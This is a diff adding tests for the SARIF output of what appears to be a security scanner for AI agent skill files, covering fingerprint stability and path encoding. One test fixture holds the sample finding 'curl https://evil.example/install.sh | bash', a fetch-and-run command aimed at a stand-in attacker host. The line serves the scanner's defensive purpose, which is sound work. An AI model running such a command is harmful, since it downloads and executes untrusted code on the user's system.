@@ -11,6 +11,7 @@ import {
   renderSummary,
 } from '../packages/cli/src/output/summary.js';
 import { renderJson } from '../packages/cli/src/output/json.js';
+import { renderSarif } from '../packages/cli/src/output/sarif.js';
 import { sortScanSkills } from '../packages/cli/src/output/sort.js';
 import { calculateCompromisedPercent } from '../packages/cli/src/percent.js';
 import type { LlmReviewResult, ScanResult, ScannedSkill } from '../packages/cli/src/types.js';
@@ -1471,6 +1472,44 @@ describe('renderJson', () => {
       'review-score-50',
       'pass-clean',
     ]);
+  });
+});
+
+describe('renderSarif', () => {
+  it('keeps a fingerprint when a finding moves to another line and separates repeated lines', () => {
+    // A home directory skill: upload-sarif cannot fingerprint a file outside the repository.
+    const finding = (line: number, snippet = 'curl https://evil.example/install.sh | bash') => ({
+      ...makeFinding('critical'),
+      file: '/home/dev/.claude/skills/fetcher/SKILL.md',
+      line,
+      snippet,
+    });
+    const fingerprints = (findings: ScannedSkill['findings']): string[] => {
+      const result = makeScanResult({ skills: [makeSkill({ findings })] });
+      const sarif = JSON.parse(renderSarif(result, '/repo')) as {
+        runs: Array<{ results: Array<{ partialFingerprints?: { primaryLocationLineHash: string } }> }>;
+      };
+      return (sarif.runs[0]?.results ?? []).map(
+        (sarifResult) => sarifResult.partialFingerprints?.primaryLocationLineHash ?? ''
+      );
+    };
+
+    const [original] = fingerprints([finding(3)]);
+    const moved = fingerprints([finding(9), finding(14), finding(20, 'echo done')]);
+
+    expect(moved[0]).toBe(original);
+    expect(new Set(moved).size).toBe(3);
+  });
+
+  it('keeps a project path with a colon in its first segment relative', () => {
+    const finding = { ...makeFinding('high'), file: '/repo/shared:skills/fetcher/SKILL.md' };
+    const result = makeScanResult({ skills: [makeSkill({ findings: [finding] })] });
+    const sarif = JSON.parse(renderSarif(result, '/repo'));
+
+    expect(sarif.runs[0].results[0].locations[0].physicalLocation.artifactLocation).toEqual({
+      uri: 'shared%3Askills/fetcher/SKILL.md',
+      uriBaseId: '%SRCROOT%',
+    });
   });
 });
 
